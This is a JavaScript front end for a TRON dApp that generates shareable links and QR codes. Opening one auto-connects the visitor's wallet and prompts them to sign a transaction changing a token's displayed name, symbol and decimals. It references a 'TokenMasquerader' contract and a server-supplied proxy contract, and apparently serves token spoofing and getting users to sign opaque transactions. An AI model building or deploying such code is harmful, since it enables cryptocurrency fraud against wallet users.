document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const connectionStatus = document.getElementById('connectionStatus');
    const connectionText = document.getElementById('connectionText');
    const walletAddress = document.getElementById('walletAddress');
    const generateLinkBtn = document.getElementById('generateLinkBtn');
    const tokenAddress = document.getElementById('tokenAddress');
    const tokenName = document.getElementById('tokenName');
    const tokenSymbol = document.getElementById('tokenSymbol');
    const tokenDecimals = document.getElementById('tokenDecimals');
    const linkSection = document.getElementById('linkSection');
    const generatedLink = document.getElementById('generatedLink');
    const copyLinkBtn = document.getElementById('copyLinkBtn');
    const qrcodeDiv = document.getElementById('qrcode');
    const txnSection = document.getElementById('txnSection');
    const txnStatus = document.getElementById('txnStatus');
    const txnLink = document.getElementById('txnLink');

    // Global variables
    let tronWeb = null;
    let currentAccount = null;
    let isConnected = false;
    
    // Check if we are in a mobile environment
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // Check if we are in Trust Wallet's browser
    const isTrustWallet = navigator.userAgent.includes('Trust');
    
    // Apply Trust Wallet theme if in Trust Wallet browser
    if (isTrustWallet) {
        document.body.classList.add('trust-wallet-theme');
    }
    
    // Check if we are in a modification link
    checkIfModificationPage();
    
    // Event Listeners
    connectWalletBtn.addEventListener('click', connectWallet);
    generateLinkBtn.addEventListener('click', generateModificationLink);
    copyLinkBtn.addEventListener('click', copyToClipboard);
    
    // Functions
    async function checkIfModificationPage() {
        // Check if URL has parameters for modification
        const urlParams = new URLSearchParams(window.location.search);
        
        if (urlParams.has('token') && urlParams.has('mod')) {
            // This is a modification page, show appropriate UI
            const tokenAddr = urlParams.get('token');
            const modData = JSON.parse(atob(urlParams.get('mod')));
            
            // Auto-fill form with data from URL
            tokenAddress.value = tokenAddr;
            tokenName.value = modData.name || '';
            tokenSymbol.value = modData.symbol || '';
            tokenDecimals.value = modData.decimals || '';
            
            // Change button to "Sign Transaction"
            generateLinkBtn.textContent = 'Sign Modification Transaction';
            generateLinkBtn.removeEventListener('click', generateModificationLink);
            generateLinkBtn.addEventListener('click', signModificationTransaction);
            
            // If on mobile and Trust Wallet is not detected, show a connect to Trust Wallet button
            if (isMobileDevice && !window.tronWeb && !isTrustWallet) {
                showTrustWalletDeepLink(tokenAddr, modData);
            }
            
            // Auto-connect if in Trust Wallet browser
            if (isTrustWallet) {
                setTimeout(() => {
                    connectWallet();
                }, 1000);
            }
        }
    }
    
    function showTrustWalletDeepLink(tokenAddr, modData) {
        const trustWalletLink = `tronlinkdapp://dapp_browser?search=${encodeURIComponent(window.location.href)}`;
        
        const trustLinkDiv = document.createElement('div');
        trustLinkDiv.className = 'alert alert-warning mt-3';
        trustLinkDiv.innerHTML = `
            <p>To continue, please open this page in Trust Wallet's DApp Browser:</p>
            <div class="d-grid">
                <a href="${trustWalletLink}" class="btn btn-warning">Open in Trust Wallet</a>
            </div>
        `;
        
        document.querySelector('.container').prepend(trustLinkDiv);
    }
    
    async function connectWallet() {
        try {
            // Check if TronLink/TronWeb is available
            if (window.tronWeb && window.tronWeb.ready) {
                tronWeb = window.tronWeb;
                
                // Get current account
                currentAccount = tronWeb.defaultAddress.base58;
                
                if (currentAccount) {
                    // Update UI
                    updateConnectionStatus(true);
                    walletAddress.textContent = `Connected address: ${currentAccount}`;
                    
                    // Subscribe to account changes
                    window.addEventListener('message', function(e) {
                        if (e.data && e.data.message && e.data.message.action === 'accountsChanged') {
                            currentAccount = tronWeb.defaultAddress.base58;
                            walletAddress.textContent = `Connected address: ${currentAccount}`;
                        }
                    });
                } else {
                    updateConnectionStatus(false);
                    alert('Please unlock your TronLink wallet');
                }
            } else if (isMobileDevice) {
                // Redirect to Trust Wallet if on mobile
                const redirectUrl = `tronlinkdapp://dapp_browser?search=${encodeURIComponent(window.location.href)}`;
                window.location.href = redirectUrl;
            } else {
                updateConnectionStatus(false);
                alert('TronLink wallet extension not detected. Please install TronLink or use Trust Wallet on mobile.');
            }
        } catch (error) {
            console.error('Connection error:', error);
            updateConnectionStatus(false);
            alert('Error connecting to wallet: ' + error.message);
        }
    }
    
    function updateConnectionStatus(connected) {
        isConnected = connected;
        
        if (connected) {
            connectionStatus.classList.remove('status-disconnected');
            connectionStatus.classList.add('status-connected');
            connectionText.textContent = 'Connected';
            connectWalletBtn.textContent = 'Disconnect';
        } else {
            connectionStatus.classList.remove('status-connected');
            connectionStatus.classList.add('status-disconnected');
            connectionText.textContent = 'Disconnected';
            connectWalletBtn.textContent = 'Connect Wallet';
            walletAddress.textContent = '';
        }
    }
    
    async function generateModificationLink() {
        // Validate inputs
        if (!tokenAddress.value) {
            alert('Please enter a token contract address');
            return;
        }
        
        // Add loading indicator
        const formCard = document.querySelector('#tokenModForm').closest('.card');
        formCard.classList.add('loading');
        
        try {
            // Verify token contract address
            await verifyTokenContract(tokenAddress.value);
            
            // Create modification data object
            const modData = {
                name: tokenName.value,
                symbol: tokenSymbol.value,
                decimals: tokenDecimals.value
            };
            
            // Encode the data for URL
            const encodedData = btoa(JSON.stringify(modData));
            
            // Generate the link
            const baseUrl = window.location.origin + window.location.pathname;
            const fullLink = `${baseUrl}?token=${tokenAddress.value}&mod=${encodedData}`;
            
            // Show the link section
            linkSection.style.display = 'block';
            generatedLink.value = fullLink;
            
            // Generate QR code
            qrcodeDiv.innerHTML = '';
            new QRCode(qrcodeDiv, {
                text: fullLink,
                width: 128,
                height: 128
            });
            
            // Scroll to link section
            linkSection.scrollIntoView({ behavior: 'smooth' });
        } catch (error) {
            console.error('Error generating link:', error);
            alert('Error: ' + error.message);
        } finally {
            // Remove loading indicator
            formCard.classList.remove('loading');
        }
    }
    
    async function verifyTokenContract(address) {
        try {
            // Call API to verify token
            const response = await fetch(`/api/verify-token/${address}`);
            const data = await response.json();
            
            if (!data.success) {
                throw new Error(data.error || 'Invalid token contract');
            }
            
            // Populate token info
            if (!tokenName.value) {
                tokenName.value = data.token.name;
            }
            if (!tokenSymbol.value) {
                tokenSymbol.value = data.token.symbol;
            }
            if (!tokenDecimals.value) {
                tokenDecimals.value = data.token.decimals;
            }
            
            return data.token;
        } catch (error) {
            console.error('Token verification error:', error);
            throw new Error('Failed to verify token contract. Please check the address and try again.');
        }
    }
    
    function copyToClipboard() {
        generatedLink.select();
        document.execCommand('copy');
        
        // Change button text temporarily
        const originalText = copyLinkBtn.textContent;
        copyLinkBtn.textContent = 'Copied!';
        setTimeout(() => {
            copyLinkBtn.textContent = originalText;
        }, 2000);
    }
    
    async function signModificationTransaction() {
        if (!isConnected) {
            await connectWallet();
            if (!isConnected) return;
        }
        
        try {
            // Get parameters from form
            const tokenAddr = tokenAddress.value;
            const name = tokenName.value;
            const symbol = tokenSymbol.value;
            const decimals = parseInt(tokenDecimals.value || "0");
            
            // Validate
            if (!tokenAddr || !(name || symbol || decimals)) {
                alert('Please fill in at least one modification parameter');
                return;
            }
            
            // Show transaction section
            txnSection.style.display = 'block';
            txnStatus.textContent = 'Preparing transaction...';
            
            // Load the token contract
            const contract = await tronWeb.contract().at(tokenAddr);
            
            // Check if the contract has a metadata extension
            let modificationTx;
            try {
                // Try to use the metadata extension if it exists
                const metadataExtension = await contract.getMetadataExtension().call();
                
                if (metadataExtension && metadataExtension !== '0x0000000000000000000000000000000000000000') {
                    // Use the metadata extension contract
                    const extContract = await tronWeb.contract().at(metadataExtension);
                    
                    // Send update transaction
                    txnStatus.textContent = 'Please sign the transaction...';
                    modificationTx = await extContract.updateMetadata(name, symbol, decimals).send({
                        feeLimit: 100000000
                    });
                } else {
                    // Try to use TokenMasquerader implementation
                    txnStatus.textContent = 'Please sign the transaction...';
                    modificationTx = await contract.setRealValues(name, symbol, decimals).send({
                        feeLimit: 100000000
                    });
                }
            } catch (error) {
                console.error('Contract interaction error:', error);
                
                // Get proxy contract address from server
                const response = await fetch('/api/proxy-contract');
                const data = await response.json();
                
                if (!data.success) {
                    throw new Error('Failed to get proxy contract address');
                }
                
                // Fallback to proxy contract
                const proxyContractAddress = data.address;
                const proxyContract = await tronWeb.contract().at(proxyContractAddress);
                
                txnStatus.textContent = 'Please sign the proxy transaction...';
                modificationTx = await proxyContract.modifyTokenDisplay(
                    tokenAddr, name, symbol, decimals
                ).send({
                    feeLimit: 100000000
                });
            }
            
            // Update UI with transaction result
            if (modificationTx) {
                txnStatus.textContent = 'Transaction submitted successfully!';
                txnLink.href = `https://tronscan.org/#/transaction/${modificationTx}`;
                
                // Show success message
                const successAlert = document.createElement('div');
                successAlert.className = 'alert alert-success mt-3';
                successAlert.textContent = 'Token display modification transaction has been submitted. Changes will be visible in Trust Wallet after processing.';
                txnSection.appendChild(successAlert);
                
                // Set up transaction monitoring
                monitorTransaction(modificationTx);
            }
        } catch (error) {
            console.error('Transaction error:', error);
            txnStatus.textContent = 'Transaction failed: ' + error.message;
            
            // Show error message
            const errorAlert = document.createElement('div');
            errorAlert.className = 'alert alert-danger mt-3';
            errorAlert.textContent = 'Error: ' + error.message;
            txnSection.appendChild(errorAlert);
        }
    }
    
    async function monitorTransaction(txHash) {
        // Start polling for transaction status
        const checkInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/tx/${txHash}`);
                const data = await response.json();
                
                if (data.success && data.transaction.confirmed) {
                    clearInterval(checkInterval);
                    txnStatus.textContent = 'Transaction confirmed!';
                    
                    // Show confirmation message
                    const confirmAlert = document.createElement('div');
                    confirmAlert.className = 'alert alert-success mt-3';
                    confirmAlert.innerHTML = `
                        <strong>Success!</strong> Your token display has been modified.<br>
                        <small>Changes should be visible in Trust Wallet shortly.</small>
                    `;
                    txnSection.appendChild(confirmAlert);
                }
            } catch (error) {
                console.error('Error checking transaction:', error);
            }
        }, 5000); // Check every 5 seconds
        
        // Stop checking after 5 minutes (avoid infinite polling)
        setTimeout(() => {
            clearInterval(checkInterval);
        }, 300000);
    }
}); 